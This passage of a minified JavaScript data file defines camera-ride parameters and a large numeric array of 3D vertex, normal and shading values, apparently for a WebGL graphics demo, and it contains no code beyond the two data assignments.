Acko.CameraRides=[[16,!0,-550,1253,.01,1,.08,!1,[-200,400,-1E3],!0],[4,!0,-293,2560,27,1.4,.06],[13,!0,150,3651,20,1.4,.08],[2,!1,264,1845,28,1.4,.08],[8,!0,550,2777,13,1.4,.1],[10,!1,339,2865,19,1.4,.08,!0],[11,!1,786,3632,24,1.5,.08,!0],[6,!1,700,2306,30,1.4,.08],[6,!0,682,1904,30,1.4,.08,!0],[17,!0,-630,1308,.01,1.2,.08,!0,[400,-400,-200],!0],[2,!0,700,2285,28,1.4,.08,!0],[13,!1,872,3413,20,1.4,.08,!0],[8,!0,589,2816,13,1.4,.1,!0],[4,!0,460,2662,27,1.4,.06,!0],[11,!1,6,2868,24,1.5,.08],[10,!1,
309,3012,19,1.4,.08],[9,!0,697,3086,14,1.5,.08,!0],[19,!0,-800,465,.05,1.2,.08,!1,[50,150,-170],!0],[18,!1,195,1458,.01,1.2,.08,!0,[-100,-400,-100],!0],[2,!1,1050,2324,28,1.4,.08,!0],[9,!0,460,2362,14,1.5,.08,!1],[12,!0,910,2174,13,1.4,.08,!0],[10,!0,270,2040,18,1.4,.08],[8,!1,1452,6E3,13,1.4,.08]];Acko.AOData="[[953,2129,40,16.6,[[-433,6.05,-11.1,0.074,0.407,-0.910,0.505,0],[-435,36.0,2.05,0.074,0.407,-0.910,0.543,0],[-390,10.1,-6.48,0.017,0.395,-0.918,0.587,0.009],[-399,39.4,5.97,0.017,0.395,-0.918,0.532,0],[-349,35.1,-1.59,-0.195,0.270,-0.942,0.694,0.050],[-373,55.0,9.04,-0.195,0.270,-0.942,0.538,0.004],[-325,70.1,1.20,-0.239,0.212,-0.947,0.570,0.075],[-352,85.7,11.5,-0.239,0.212,-0.947,0.420,0.031],[-305,103,3.65,-0.224,0.227,-0.946,0.390,0.096],[-331,120,13.9,-0.224,0.227,-0.946,0.273,0.053],[-282,121,6.14,-0.012,0.383,-0.922,0.273,0.122],[-292,150,18.2,-0.012,0.383,-0.922,0.115,0.052],[-254,121,9.18,0.251,0.366,-0.894,0.257,0.110],[-243,148,23.4,0.251,0.366,-0.894,0.115,0.057],[-245,100,9.92,0.490,0.035,-0.870,0.462,0.110],[-217,102,26.0,0.490,0.035,-0.870,0.388,0.060],[-244,61.6,9.80,0.492,0.018,-0.870,0.728,0.076],[-215,61.8,25.9,0.492,0.018,-0.870,0.639,0.049],[-244,22.6,8.09,0.494,0.096,-0.862,0.690,0.090],[-215,20.8,24.2,0.494,0.096,-0.862,0.627,0.062],[-244,4.59,-7.81,0.492,0.870,0.008,0.302,0.603],[-215,-11.5,-7.78,0.492,0.870,0.008,0.228,0.594],[-243,7.78,-47.1,0.489,0.863,0.119,0.478,0.608],[-215,-8.31,-48.1,0.489,0.863,0.119,0.383,0.342],[-239,13.0,-89.0,0.477,0.854,0.203,0.558,0.559],[-211,-3.58,-85.2,0.477,0.854,0.203,0.516,0.414],[-203,15.4,-128,0.173,0.834,0.522,0.325,0.587],[-197,-2.59,-101,0.173,0.834,0.522,0.417,0.534],[-163,12.0,-133,0.203,0.832,0.512,0.218,0.450],[-158,-5.80,-106,0.203,0.832,0.512,0.288,0.554],[-147,10.4,-149,0.597,0.791,0.119,0.242,0.320],[-122,-9.53,-143,0.597,0.791,0.119,0.191,0.269],[-143,10.1,-186,0.612,0.789,0.034,0.218,0.138],[-117,-10,-185,0.612,0.789,0.034,0.217,0.113],[-140,10,-227,0.606,0.791,0.068,0.248,0.098],[-114,-10,-224,0.606,0.791,0.068,0.268,0.065],[-116,10,-271,0.243,0.791,0.559,0.215,0.015],[-105,-10,-248,0.243,0.791,0.559,0.226,0.038],[-70.4,10.8,-273,-0.141,0.784,0.603,0.196,0.024],[-72.6,-9.37,-247,-0.141,0.784,0.603,0.261,0.014],[-42.8,18.4,-270,-0.512,0.616,0.597,0.184,0.112],[-26.2,7.08,-244,-0.512,0.616,0.597,0.218,0.124],[-37.4,45.0,-280,-0.661,0.280,0.695,0.216,0.356],[-12.8,52.3,-259,-0.661,0.280,0.695,0.208,0.296],[-38.2,81.5,-294,-0.661,0.244,0.708,0.116,0.523],[-13.6,90.3,-274,-0.661,0.244,0.708,0.072,0.416],[-40.3,119,-308,-0.659,0.203,0.723,0.120,0.488],[-15.7,127,-288,-0.659,0.203,0.723,0.063,0.422],[-41.9,160,-317,-0.655,0.091,0.749,0.137,0.296],[-17.1,164,-296,-0.655,0.091,0.749,0.105,0.218],[-42.3,201,-320,-0.654,0.011,0.756,0.109,0.080],[-17.5,202,-299,-0.654,0.011,0.756,0.135,0.122],[-42.4,242,-320,-0.654,0.001,0.756,0.147,0.067],[-17.5,242,-299,-0.654,0.001,0.756,0.176,0.119],[-42.4,282,-320,-0.654,0,0.756,0.175,0.068],[-17.5,282,-299,-0.654,0,0.756,0.192,0.113],[-42.4,322,-320,-0.654,0,0.756,0.071,0.068],[-17.5,322,-299,-0.654,0,0.756,0.132,0.105],[-42.4,362,-320,-0.654,0,0.756,0,0.061],[-17.5,362,-299,-0.654,0,0.756,0.017,0.112]]],null,[713,1979,35,17.4,[[-310,156,-183,-0.127,-0.338,-0.932,0.078,0.490],[-292,181,-195,-0.127,-0.338,-0.932,0.181,0.315],[-277,138,-179,-0.053,-0.377,-0.924,0.232,0.426],[-264,166,-192,-0.053,-0.377,-0.924,0.216,0.264],[-239,128,-176,0.032,-0.401,-0.915,0.371,0.437],[-235,158,-189,0.032,-0.401,-0.915,0.365,0.282],[-203,126,-173,0.061,-0.403,-0.912,0.432,0.475],[-201,156,-186,0.061,-0.403,-0.912,0.357,0.305],[-168,125,-170,0.074,-0.404,-0.911,0.359,0.557],[-167,155,-183,0.074,-0.404,-0.911,0.347,0.402],[-133,125,-166,0.093,-0.405,-0.909,0.257,0.568],[-132,155,-180,0.093,-0.405,-0.909,0.251,0.561],[-99.5,125,-162,0.162,-0.407,-0.896,0.141,0.529],[-97.1,154,-175,0.162,-0.407,-0.896,0.137,0.569],[-70.5,125,-151,0.595,-0.407,-0.692,0.040,0.523],[-61.8,154,-161,0.595,-0.407,-0.692,0.045,0.531],[-56.0,124,-124,0.891,-0.405,-0.199,0.178,0.453],[-43.0,155,-127,0.891,-0.405,-0.199,0.185,0.469],[-50.2,124,-90.8,0.906,-0.405,-0.118,0.302,0.424],[-37.0,155,-92.6,0.906,-0.405,-0.118,0.378,0.453],[-46.4,124,-56.4,0.910,-0.405,-0.074,0.346,0.372],[-33.2,155,-57.5,0.910,-0.405,-0.074,0.461,0.447],[-45.0,125,-22.0,0.911,-0.407,0.009,0.285,0.342],[-31.6,154,-21.9,0.911,-0.407,0.009,0.322,0.480],[-51.4,125,7.24,0.717,-0.408,0.562,0.197,0.383],[-40.9,154,15.5,0.717,-0.408,0.562,0.148,0.237],[-77.7,124,19.1,0.118,-0.407,0.905,0.071,0.389],[-76.2,154,32.4,0.118,-0.407,0.905,0.039,0.231],[-110,123,20.1,0.007,-0.404,0.913,0.079,0.296],[-113,153,33.3,0.007,-0.404,0.913,0.039,0.167],[-134,116,18.9,0.209,-0.313,0.925,0.074,0.256],[-154,139,31.2,0.209,-0.313,0.925,0.035,0.146],[-142,95.3,18.3,0.351,-0.046,0.934,0.089,0.330],[-173,98.6,30,0.351,-0.046,0.934,0.047,0.300],[-142,63.8,18.4,0.348,0.050,0.935,0.083,0.538],[-173,60.2,29.9,0.348,0.050,0.935,0.050,0.525],[-134,42.9,18.9,0.194,0.324,0.924,0.073,0.676],[-153,19.2,31.3,0.194,0.324,0.924,0.039,0.674],[-109,37.3,20,-0.003,0.406,0.913,0.083,0.642],[-111,7.43,33.3,-0.003,0.406,0.913,0.043,0.564],[-75.1,35.9,21.2,-0.024,0.407,0.912,0.070,0.536],[-75.9,6.00,34.6,-0.024,0.407,0.912,0.036,0.422],[-40.8,36.3,22.3,-0.036,0.406,0.912,0.078,0.509],[-40.3,6.33,35.6,-0.036,0.406,0.912,0.028,0.331],[-8.03,38.7,23.1,-0.079,0.398,0.912,0.095,0.432],[-3.43,9.08,36.4,-0.079,0.398,0.912,0.037,0.233],[8.71,48.1,23.1,-0.369,0.172,0.912,0.069,0.462],[36.0,35.7,36.5,-0.369,0.172,0.912,0.030,0.357],[13.1,77.1,22.9,-0.409,0.030,0.911,0.076,0.555],[43.0,75.3,36.4,-0.409,0.030,0.911,0.038,0.481],[14.4,111,22.6,-0.410,0.021,0.911,0.081,0.524],[44.3,110,36.1,-0.410,0.021,0.911,0.036,0.366],[14.9,146,21.8,-0.411,0.035,0.910,0.069,0.403],[44.8,146,35.3,-0.411,0.035,0.910,0.028,0.372],[15.2,180,19.6,-0.412,0.122,0.900,0.032,0.474],[45.0,181,33.1,-0.412,0.122,0.900,0.013,0.382],[15.8,205,6.77,-0.390,0.790,0.470,0.002,0.413],[46.0,216,14.6,-0.390,0.790,0.470,0,0.314],[17.1,212,-24.1,-0.368,0.928,0.049,0.048,0.417],[47.6,224,-22.1,-0.368,0.928,0.049,0.049,0.323],[18.2,213,-58.6,-0.366,0.929,0.013,0.193,0.310],[48.8,225,-57.5,-0.366,0.929,0.013,0.510,0.249],[19.1,214,-93.5,-0.367,0.928,0.022,0.666,0.254],[49.6,226,-92.5,-0.367,0.928,0.022,0.692,0.171],[19.7,216,-128,-0.370,0.917,0.102,0.688,0.235],[50,228,-127,-0.370,0.917,0.102,0.673,0.160],[19.7,232,-163,-0.371,0.582,0.720,0.444,0.250],[50.2,239,-154,-0.371,0.582,0.720,0.381,0.232],[19.7,268,-175,-0.369,0.076,0.925,0.208,0.368],[50.2,269,-163,-0.369,0.076,0.925,0.238,0.254],[19.7,304,-176,-0.369,0.002,0.929,0.105,0.188],[50.2,304,-164,-0.369,0.002,0.929,0.145,0.139],[19.7,339,-176,-0.369,0,0.929,0.048,0.131],[50.2,339,-164,-0.369,0,0.929,0.070,0.087]]],null,[343,2524,50,18.7,[[15.0,457,-273,-0.410,0,-0.911,0,0],[44.9,457,-286,-0.410,0,-0.911,0.004,0],[15.0,407,-273,-0.410,0,-0.911,0.002,0.012],[44.9,407,-286,-0.410,0,-0.911,0.029,0],[15.0,357,-273,-0.410,0,-0.911,0.008,0.123],[44.9,357,-286,-0.410,0,-0.911,0.067,0.115],[15.0,307,-273,-0.410,0,-0.911,0.010,0.324],[44.9,307,-286,-0.410,0,-0.911,0.087,0.310],[15.0,257,-273,-0.410,0,-0.911,0.012,0.400],[44.9,257,-286,-0.410,0,-0.911,0.089,0.363],[15.0,206,-273,-0.410,-0,-0.911,0.026,0.252],[44.9,207,-286,-0.410,-0,-0.911,0.089,0.274],[15.0,156,-273,-0.410,-0,-0.911,0.072,0.077],[45.0,157,-286,-0.410,-0,-0.911,0.246,0.099],[15.2,106,-273,-0.410,-0.002,-0.911,0.358,0.078],[45.1,107,-286,-0.410,-0.002,-0.911,0.381,0.143],[16.0,56.5,-273,-0.408,-0.011,-0.912,0.322,0.190],[45.9,57.4,-286,-0.408,-0.011,-0.912,0.360,0.198],[23.2,1.83,-273,-0.377,-0.150,-0.913,0.112,0.109],[50.9,13.4,-287,-0.377,-0.150,-0.913,0.128,0.196],[75.1,-33.2,-274,-0.073,-0.382,-0.920,0.052,0.277],[79.0,-3.24,-287,-0.073,-0.382,-0.920,0.102,0.284],[123,-35.0,-269,0.428,-0.398,-0.807,0.020,0.238],[129,-4.97,-280,0.428,-0.398,-0.807,0.046,0.243],[141,-35.0,-232,0.916,-0.394,-0.063,0.004,0.297],[153,-4.89,-233,0.916,-0.394,-0.063,0.058,0.272],[142,-34.9,-182,0.919,-0.394,-0.010,0.162,0.345],[155,-4.77,-182,0.919,-0.394,-0.010,0.202,0.323],[142,-34.6,-132,0.919,-0.393,0.003,0.342,0.435],[155,-4.46,-132,0.919,-0.393,0.003,0.403,0.393],[142,-33.9,-82.6,0.918,-0.392,0.019,0.369,0.496],[155,-3.79,-83.0,0.918,-0.392,0.019,0.454,0.408],[141,-32.2,-32.2,0.916,-0.386,0.071,0.093,0.194],[154,-2.07,-33.5,0.916,-0.386,0.071,0.213,0.252],[129,-17.2,18.7,0.715,-0.135,0.684,0.030,0.148],[145,8.44,6.63,0.715,-0.135,0.684,0.079,0.283],[97.1,23.4,34.1,0.424,0.227,0.876,0.031,0.311],[119,41.9,18.6,0.424,0.227,0.876,0.090,0.458],[70.8,75.6,36.2,0.483,0.015,0.874,0.037,0.448],[99.5,76.7,20.3,0.483,0.015,0.874,0.071,0.471],[100,129,34.8,0.325,-0.340,0.882,0.034,0.301],[118,106,19.4,0.325,-0.340,0.882,0.072,0.323],[153,151,31.4,0.122,-0.429,0.894,0.023,0.139],[156,122,17.0,0.122,-0.429,0.894,0.060,0.186],[205,154,26.9,0.089,-0.433,0.896,0.017,0.163],[204,124,12.7,0.089,-0.433,0.896,0.029,0.294],[255,154,22.2,0.085,-0.432,0.897,0.038,0.150],[253,124,8.07,0.085,-0.432,0.897,0.072,0.274],[305,153,17.1,0.070,-0.430,0.899,0.086,0.313],[302,123,3.21,0.070,-0.430,0.899,0.117,0.420],[360,123,11.0,-0.303,-0.139,0.942,0.095,0.336],[330,113,0.151,-0.303,-0.139,0.942,0.097,0.373],[363,67.5,10.6,-0.324,0.033,0.945,0.078,0.354],[333,69.8,-0.075,-0.324,0.033,0.945,0.106,0.390],[333,13.3,14.1,-0.070,0.395,0.915,0.039,0.237],[320,40.4,1.43,-0.070,0.395,0.915,0.085,0.374],[278,6.09,20.2,0.091,0.433,0.896,0.045,0.202],[276,35.7,6.13,0.091,0.433,0.896,0.090,0.360],[223,12.0,25.9,0.258,0.395,0.881,0.037,0.348],[233,39.1,10.6,0.258,0.395,0.881,0.066,0.446],[196,69.9,26.6,0.506,0.157,0.845,0.060,0.446],[224,67.9,10,0.506,0.157,0.845,0.084,0.447],[195,105,-15.6,0.501,0.862,0.071,0.196,0.377],[224,89.3,-16.8,0.501,0.862,0.071,0.079,0.397],[196,107,-66.2,0.500,0.865,0.021,0.285,0.269],[224,91.2,-66.0,0.500,0.865,0.021,0.248,0.292],[198,108,-117,0.497,0.866,0.034,0.400,0.281],[226,91.6,-115,0.497,0.866,0.034,0.416,0.350],[213,107,-173,0.393,0.871,0.290,0.491,0.290],[235,91.2,-154,0.393,0.871,0.290,0.426,0.291],[267,104,-197,0.126,0.884,0.449,0.567,0.396],[271,89.4,-169,0.126,0.884,0.449,0.487,0.211],[317,102,-204,0.083,0.886,0.455,0.356,0.126],[320,87.1,-175,0.083,0.886,0.455,0.317,0.079],[369,100,-207,-0.025,0.889,0.453,0.432,0.076],[367,85.7,-178,-0.025,0.889,0.453,0.459,0.048],[416,109,-170,-0.637,0.768,-0.044,0.480,0.426],[392,90,-159,-0.637,0.768,-0.044,0.477,0.402],[421,122,-120,-0.656,0.735,-0.167,0.524,0.533],[396,101,-114,-0.656,0.735,-0.167,0.524,0.536],[422,135,-71.3,-0.657,0.732,-0.176,0.538,0.361],[397,114,-66.0,-0.657,0.732,-0.176,0.509,0.368],[422,145,-21.5,-0.657,0.744,-0.119,0.561,0.166],[397,124,-18.1,-0.657,0.744,-0.119,0.580,0.159],[422,149,29.6,-0.656,0.753,-0.018,0.388,0.044],[397,128,30.2,-0.656,0.753,-0.018,0.345,0.017],[422,150,79.8,-0.656,0.753,-0.005,0.130,0.033],[397,129,80,-0.656,0.753,-0.005,0.170,0.015]]],null,[200,3000,35,7.5,[[-540,399,-426,1,0,0,0.028,0.130],[-540,400,-405,1,0,0,0.124,0.029],[-540,364,-426,1,0,0,0.029,0.092],[-540,365,-405,1,0,0,0.090,0.031],[-540,329,-426,1,0,0,0.029,0.082],[-540,330,-405,1,0,0,0.080,0.030],[-540,294,-426,1,0,0,0.032,0.129],[-540,295,-405,1,0,0,0.123,0.034],[-540,259,-426,1,0,0,0.030,0.110],[-540,260,-404,1,0,0,0.103,0.048],[-540,224,-425,1,0,0,0.025,0.119],[-540,225,-404,1,0,0,0.069,0.088],[-540,189,-425,1,0,0,0.026,0.188],[-540,190,-404,1,0,0,0.113,0.153],[-540,154,-424,1,0,0,0.028,0.243],[-540,155,-403,1,0,0,0.123,0.197],[-540,119,-423,1,0,0,0.028,0.198],[-540,120,-402,1,0,0,0.085,0.192],[-540,84.0,-421,1,0,0,0.026,0.142],[-540,86.2,-400,1,0,0,0.137,0.159],[-540,45.7,-410,1,0,0,0.024,0.145],[-540,57.7,-392,1,0,0,0.148,0.111],[-540,22.1,-376,0.999,-0,-0,0.030,0.075],[-539,42.8,-370,0.999,-0,-0,0.184,0.103],[-539,17.1,-339,0.999,0,-0.001,0.080,0.108],[-539,38.4,-338,0.999,0,-0.001,0.175,0.107],[-539,15.6,-304,0.999,0,-0.003,0.093,0.153],[-539,37.0,-303,0.999,0,-0.003,0.235,0.083],[-539,14.9,-269,0.999,0,-0.006,0.049,0.113],[-539,36.3,-268,0.999,0,-0.006,0.137,0.043],[-539,14.5,-234,0.999,0,-0.012,0.131,0.121],[-539,36.0,-233,0.999,0,-0.012,0.265,0.104],[-538,14.3,-198,0.999,0,-0.023,0.173,0.162],[-538,35.8,-198,0.999,0,-0.023,0.311,0.161],[-537,14.3,-163,0.997,0,-0.048,0.171,0.153],[-537,35.7,-163,0.997,0,-0.048,0.324,0.137],[-534,14.3,-129,0.987,0,-0.135,0.214,0.248],[-534,35.6,-129,0.987,0,-0.135,0.261,0.186],[-524,14.2,-95.9,0.849,0,-0.526,0.283,0.342],[-524,35.7,-95.9,0.849,0,-0.526,0.371,0.339],[-498,14.2,-72.5,0.460,0,-0.886,0.339,0.331],[-498,35.7,-72.5,0.460,0,-0.886,0.474,0.299],[-465,14.2,-61.9,0.213,0,-0.976,0.329,0.325],[-465,35.7,-61.9,0.213,0,-0.976,0.457,0.308],[-431,14.3,-55.7,0.154,0,-0.988,0.294,0.392],[-431,35.7,-55.7,0.154,0,-0.988,0.414,0.393],[-396,14.3,-50.7,0.133,0,-0.991,0.354,0.447],[-396,35.7,-50.7,0.133,0,-0.991,0.487,0.448],[-361,14.6,-46.3,0.121,0,-0.992,0.444,0.395],[-362,36.0,-46.3,0.121,0,-0.992,0.581,0.433],[-323,19.4,-41.8,0.115,-0,-0.993,0.494,0.290],[-331,39.3,-42.7,0.115,-0,-0.993,0.583,0.341],[-292,38.9,-38.2,0.112,-0.001,-0.993,0.510,0.340],[-304,56.7,-39.6,0.112,-0.001,-0.993,0.595,0.274],[-264,52.2,-35.2,0.103,-0.004,-0.994,0.499,0.436],[-269,73.2,-35.8,0.103,-0.004,-0.994,0.562,0.298],[-232,53.8,-32.8,0.060,-0.008,-0.998,0.496,0.624],[-232,75.2,-33.0,0.060,-0.008,-0.998,0.462,0.509],[-197,54.0,-30.8,0.049,-0.008,-0.998,0.438,0.701],[-197,75.5,-31.0,0.049,-0.008,-0.998,0.442,0.583],[-162,54.1,-29.2,0.042,-0.008,-0.999,0.345,0.743],[-162,75.5,-29.4,0.042,-0.008,-0.999,0.432,0.596],[-127,54.1,-27.8,0.038,-0.008,-0.999,0.312,0.612],[-127,75.5,-28.0,0.038,-0.008,-0.999,0.353,0.484],[-92.3,54.1,-26.5,0.033,-0.008,-0.999,0.307,0.409],[-92.2,75.5,-26.7,0.033,-0.008,-0.999,0.312,0.286],[-57.3,54.0,-25.5,0.028,-0.008,-0.999,0.350,0.389],[-57.2,75.5,-25.7,0.028,-0.008,-0.999,0.326,0.228],[-22.3,53.9,-24.5,0.023,-0.008,-0.999,0.326,0.441],[-22.2,75.4,-24.7,0.023,-0.008,-0.999,0.344,0.343],[12.5,53.7,-23.9,0.015,-0.007,-0.999,0.287,0.571],[12.7,75.2,-24.1,0.015,-0.007,-0.999,0.292,0.560],[47.5,53.5,-23.5,0.004,-0.007,-0.999,0.239,0.637],[47.8,74.9,-23.6,0.004,-0.007,-0.999,0.319,0.653],[82.3,52.8,-23.8,-0.025,-0.004,-0.998,0.246,0.628],[82.9,74.1,-23.9,-0.025,-0.004,-0.998,0.321,0.613],[115,49.7,-27.0,-0.217,0.017,-0.975,0.153,0.558],[119,70.7,-27.6,-0.217,0.017,-0.975,0.173,0.452],[145,40,-37.2,-0.362,0.057,-0.930,0.247,0.435],[152,60,-38.8,-0.362,0.057,-0.930,0.308,0.358],[176,27.8,-49.7,-0.316,0.042,-0.947,0.292,0.397],[182,48.3,-50.9,-0.316,0.042,-0.947,0.389,0.340],[211,20.5,-58.4,-0.159,0.008,-0.987,0.208,0.330],[213,41.9,-58.6,-0.159,0.008,-0.987,0.298,0.326],[246,18.1,-63.2,-0.119,0.004,-0.992,0.307,0.317],[247,39.5,-63.2,-0.119,0.004,-0.992,0.311,0.285],[281,16.6,-67.2,-0.109,0.004,-0.993,0.383,0.311],[282,38.1,-67.2,-0.109,0.004,-0.993,0.491,0.247],[316,15.4,-70.9,-0.102,0.004,-0.994,0.361,0.274],[317,36.8,-70.9,-0.102,0.004,-0.994,0.456,0.245],[351,14.2,-74.3,-0.088,0.003,-0.995,0.314,0.231],[351,35.6,-74.3,-0.088,0.003,-0.995,0.441,0.238],[386,13.1,-76.7,-0.036,0.001,-0.998,0.262,0.232],[386,34.5,-76.7,-0.036,0.001,-0.998,0.441,0.240],[420,12.0,-74.7,0.181,-0.004,-0.982,0.285,0.238],[421,33.4,-74.7,0.181,-0.004,-0.982,0.446,0.216],[453,11.0,-63.4,0.475,-0.014,-0.878,0.211,0.143],[454,32.4,-63.3,0.475,-0.014,-0.878,0.367,0.214],[480,10.2,-41.4,0.762,-0.023,-0.644,0.081,0.152],[481,31.6,-41.4,0.762,-0.023,-0.644,0.175,0.199],[498,9.65,-11.3,0.932,-0.028,-0.359,0.028,0.204],[498,31.0,-11.3,0.932,-0.028,-0.359,0.142,0.149],[506,9.38,22.5,0.991,-0.030,-0.122,0.017,0.121],[507,30.8,22.5,0.991,-0.030,-0.122,0.090,0.108],[509,9.31,57.4,0.998,-0.030,-0.041,0.036,0.110],[509,30.7,57.4,0.998,-0.030,-0.041,0.114,0.068],[510,9.30,92.4,0.997,-0.030,-0.044,0.062,0.133],[510,30.7,92.3,0.997,-0.030,-0.044,0.192,0.035],[512,9.31,127,0.992,-0.030,-0.104,0.128,0.106],[513,30.6,127,0.992,-0.030,-0.104,0.242,0.027],[519,9.31,161,0.958,-0.030,-0.275,0.197,0.084],[519,30.6,161,0.958,-0.030,-0.275,0.178,0.006],[536,9.30,191,0.718,-0.030,-0.693,0.215,0.102],[537,30.6,191,0.718,-0.030,-0.693,0.273,0.018],[566,9.29,210,0.320,-0.030,-0.946,0.261,0.115],[566,30.7,209,0.320,-0.030,-0.946,0.331,0.024],[600,9.29,217,0.137,-0.030,-0.990,0.252,0.097],[600,30.7,216,0.137,-0.030,-0.990,0.292,0.020],[635,9.31,221,0.089,-0.030,-0.995,0.185,0.098],[635,30.7,220,0.089,-0.030,-0.995,0.275,0.034],[670,9.35,224,0.068,-0.030,-0.997,0.115,0.142],[670,30.7,223,0.068,-0.030,-0.997,0.249,0.042],[705,9.45,226,0.056,-0.030,-0.997,0.067,0.094],[705,30.8,225,0.056,-0.030,-0.997,0.161,0.038],[740,9.55,228,0.049,-0.030,-0.998,0.050,0.082],[740,30.9,227,0.049,-0.030,-0.998,0.123,0.029],[775,9.78,229,0.043,-0.030,-0.998,0.032,0.129],[775,31.2,228,0.043,-0.030,-0.998,0.149,0.033],[810,10,231,0.040,-0.030,-0.998,0.031,0.110],[810,31.4,230,0.040,-0.030,-0.998,0.107,0.033],[845,10.5,232,0.037,-0.030,-0.998,0.029,0.076],[844,32.0,231,0.037,-0.030,-0.998,0.080,0.030],[880,11.4,233,0.037,-0.030,-0.998,0.033,0.105],[879,32.8,232,0.037,-0.030,-0.998,0.118,0.036],[915,13.2,234,0.042,-0.029,-0.998,0.033,0.127],[914,34.5,234,0.042,-0.029,-0.998,0.142,0.042],[952,19.3,236,0.068,-0.024,-0.997,0.023,0.046],[946,39.9,235,0.068,-0.024,-0.997,0.132,0.044],[986,39.8,239,0.094,-0.012,-0.995,0.022,0.054],[971,55.4,237,0.094,-0.012,-0.995,0.152,0.045],[1008,72.1,241,0.100,-0.004,-0.994,0.030,0.127],[988,80.3,239,0.100,-0.004,-0.994,0.162,0.043],[1016,109,242,0.101,-0,-0.994,0.090,0.075],[995,111,239,0.101,-0,-0.994,0.210,0.037],[1018,144,242,0.101,-0,-0.994,0.161,0.078],[997,145,240,0.101,-0,-0.994,0.251,0.033],[1019,179,242,0.101,-0,-0.994,0.171,0.128],[998,180,240,0.101,-0,-0.994,0.280,0.035],[1020,215,242,0.101,-0,-0.994,0.098,0.109],[998,215,240,0.101,-0,-0.994,0.210,0.033],[1020,250,242,0.101,-0,-0.994,0.308,0.079],[999,250,240,0.101,-0,-0.994,0.382,0.029],[1020,285,242,0.101,-0,-0.994,0.309,0.110],[999,285,240,0.101,-0,-0.994,0.386,0.033],[1020,320,242,0.101,-0,-0.994,0.221,0.128],[999,320,240,0.101,-0,-0.994,0.290,0.033],[1020,355,242,0.101,-0,-0.994,0.102,0.080],[999,355,240,0.101,-0,-0.994,0.142,0.028],[1020,390,242,0.101,-0,-0.994,0.042,0.072],[999,390,240,0.101,-0,-0.994,0.089,0.022]]],[200,3000,50,23.0,[[-549,399,-439,0.928,-0.001,-0.371,0.084,0.005],[-530,400,-393,0.928,-0.001,-0.371,0.005,0.089],[-549,349,-439,0.928,-0.001,-0.371,0.041,0.006],[-530,350,-392,0.928,-0.001,-0.371,0.006,0.043],[-549,299,-439,0.928,-0.002,-0.371,0.077,0.006],[-530,300,-392,0.928,-0.002,-0.371,0.006,0.081],[-549,249,-438,0.928,-0.003,-0.371,0.054,0.006],[-530,250,-392,0.928,-0.003,-0.371,0.006,0.097],[-549,199,-438,0.928,-0.005,-0.370,0.050,0.061],[-530,200,-391,0.928,-0.005,-0.370,0.029,0.214],[-549,149,-437,0.928,-0.008,-0.369,0.066,0.129],[-530,150,-390,0.928,-0.008,-0.369,0.005,0.329],[-549,98.5,-435,0.929,-0.023,-0.367,0.033,0.129],[-530,101,-388,0.929,-0.023,-0.367,0.005,0.279],[-549,38.8,-421,0.929,-0.204,-0.305,0.079,0.030],[-530,64.6,-382,0.929,-0.204,-0.305,0.003,0.295],[-549,6.65,-361,0.928,-0.368,-0.042,0.029,0.034],[-530,52.8,-356,0.928,-0.368,-0.042,0.053,0.234],[-549,3.30,-309,0.928,-0.370,-0.014,0.099,0.030],[-530,49.7,-308,0.928,-0.370,-0.014,0.114,0.248],[-548,2.30,-259,0.928,-0.371,-0.012,0.071,0.024],[-530,48.7,-258,0.928,-0.371,-0.012,0.032,0.158],[-548,1.94,-208,0.927,-0.371,-0.020,0.100,0.059],[-529,48.3,-209,0.927,-0.371,-0.020,0.152,0.282],[-546,1.85,-158,0.924,-0.372,-0.051,0.145,0.078],[-528,48.1,-159,0.924,-0.372,-0.051,0.215,0.290],[-539,1.83,-106,0.880,-0.373,-0.289,0.135,0.279],[-521,48.1,-112,0.880,-0.373,-0.289,0.243,0.291],[-503,1.81,-64.2,0.427,-0.372,-0.823,0.229,0.293],[-494,48.1,-80.7,0.427,-0.372,-0.823,0.427,0.478],[-452,1.79,-49.8,0.166,-0.371,-0.913,0.196,0.314],[-449,48.2,-68.1,0.166,-0.371,-0.913,0.383,0.502],[-402,1.84,-42.2,0.126,-0.370,-0.920,0.262,0.366],[-400,48.2,-60.6,0.126,-0.370,-0.920,0.303,0.571],[-352,2.30,-35.8,0.122,-0.369,-0.920,0.400,0.206],[-351,48.7,-54.4,0.122,-0.369,-0.920,0.457,0.469],[-294,23.0,-29.1,0.311,-0.308,-0.898,0.582,0.076],[-318,61.4,-50.5,0.311,-0.308,-0.898,0.570,0.381],[-260,40.4,-25.4,0.125,-0.374,-0.918,0.555,0.213],[-263,86.5,-44.6,0.125,-0.374,-0.918,0.542,0.324],[-212,41.6,-22.2,0.050,-0.379,-0.923,0.515,0.500],[-211,87.8,-41.2,0.050,-0.379,-0.923,0.464,0.441],[-162,41.7,-19.8,0.040,-0.379,-0.924,0.509,0.543],[-161,88.0,-38.8,0.040,-0.379,-0.924,0.430,0.511],[-112,41.7,-17.9,0.033,-0.379,-0.924,0.461,0.450],[-111,88.0,-36.8,0.033,-0.379,-0.924,0.320,0.422],[-62.6,41.6,-16.2,0.026,-0.379,-0.924,0.440,0.349],[-61.9,87.9,-35.2,0.026,-0.379,-0.924,0.233,0.391],[-12.6,41.5,-14.9,0.018,-0.379,-0.924,0.326,0.534],[-12.0,87.8,-33.8,0.018,-0.379,-0.924,0.238,0.619],[37.3,41.1,-14.1,0.004,-0.378,-0.924,0.187,0.616],[37.9,87.4,-33.1,0.004,-0.378,-0.924,0.238,0.760],[87.0,40.1,-14.7,-0.050,-0.374,-0.923,0.245,0.551],[88.2,86.3,-33.5,-0.050,-0.374,-0.923,0.330,0.605],[131,32.5,-22.6,-0.415,-0.311,-0.854,0.290,0.447],[139,77.4,-43.0,-0.415,-0.311,-0.854,0.263,0.398],[175,15.5,-40.2,-0.402,-0.315,-0.858,0.370,0.306],[183,60.6,-60.4,-0.402,-0.315,-0.858,0.283,0.507],[227,6.81,-51.4,-0.147,-0.365,-0.919,0.216,0.305],[227,53.2,-70,-0.147,-0.365,-0.919,0.132,0.409],[277,4.35,-57.4,-0.117,-0.367,-0.922,0.318,0.253],[276,50.8,-75.9,-0.117,-0.367,-0.922,0.366,0.353],[326,2.57,-62.7,-0.105,-0.367,-0.923,0.252,0.213],[326,49.0,-81.1,-0.105,-0.367,-0.923,0.273,0.336],[376,0.977,-67.0,-0.069,-0.369,-0.926,0.118,0.193],[376,47.3,-85.5,-0.069,-0.369,-0.926,0.165,0.344],[423,-0.492,-64.6,0.191,-0.378,-0.905,0.127,0.189],[428,45.7,-82.7,0.191,-0.378,-0.905,0.092,0.275],[463,-1.75,-4